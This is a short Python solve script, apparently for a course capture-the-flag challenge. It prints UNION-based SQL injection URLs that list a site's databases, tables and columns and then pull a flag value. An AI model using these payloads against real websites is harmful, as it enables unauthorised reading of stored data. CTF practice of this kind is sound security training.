# import requests

url = 'https://edu-ctf.csie.org:10158/news.php?id=-1 '


sqli = 'UNION SELECT 1, schema_name, 3 FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET 1'
# db name: fl4g

for offset in range(0, 50):
    sqli = 'UNION SELECT 1, table_name, 3 FROM INFORMATION_SCHEMA.TABLES LIMIT 3 OFFSET ' + str(offset)
    print(url + sqli)
# table name: secret
    
# offset 28 is secret
for offset in range(0, 5):
    sqli = 'UNION SELECT 1, COLUMN_NAME, 3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=\'secret\' LIMIT 1 OFFSET 0'
    print(url + sqli)
# column: {id, this_is_flag_yo}

sqli = 'UNION SELECT 1, this_is_flag_yo, 3 FROM fl4g.secret'

